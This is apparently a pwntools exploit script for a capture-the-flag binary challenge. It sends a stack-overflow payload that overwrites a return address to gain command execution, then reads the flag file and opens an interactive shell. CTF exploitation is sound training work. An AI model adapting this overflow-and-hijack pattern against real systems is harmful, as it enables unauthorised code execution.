#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 31984
HOST = "0.cloud.chals.io"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x000000000023C56A
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
payload = b'\0'*0x48 + p64(0x000000000023C4F3)
# GDB()
p.sendafter(b'something:\n\n', payload)
p.sendline(b'cat flag.txt')

p.interactive()